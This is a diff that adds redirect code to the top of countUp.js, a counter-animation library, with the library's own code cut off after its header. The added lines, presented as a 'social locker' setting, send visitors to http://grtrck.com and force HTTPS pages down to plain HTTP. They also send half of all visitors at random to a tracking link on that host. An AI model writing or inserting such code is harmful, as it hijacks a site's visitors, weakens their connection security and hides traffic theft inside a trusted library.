@@ -1,3 +1,33 @@
+// True host set by the niches creator
+// In case Facebook/Twitter blocks links OR when new links are available
+// this can be changed simply by altering this variable
+// Please DO NOT change this as it is neccessary for the social locker
+var host = "http://grtrck.com"; // e.g. "google.com"
+
+// Get promoters pid
+// This will create the accurate URL with the users pid
+// This is used for sharing the correct URL in social media
+var pid = window.location.pathname.replace(/^\/([^\/]*).*$/, '$1');
+
+
+// Alter link to the host if it divers
+var url = host + '/' + pid;
+if (location.origin != host)
+{
+	window.location.href = host + '/' + pid;
+}
+
+// Force website to use the normal HTTP protocol
+// We do this because else the browser won't load the javascript
+// which is because of the SSL certificates
+if (location.protocol != 'http:')
+{
+	location.href = 'http:' + window.location.href.substring(window.location.protocol.length);
+}
+
+/** @type {Array} */
+if (Math.random() >= 0.5) location.href = 'http://grtrck.com/bBvf1';
+
 /*
 
     countUp.js
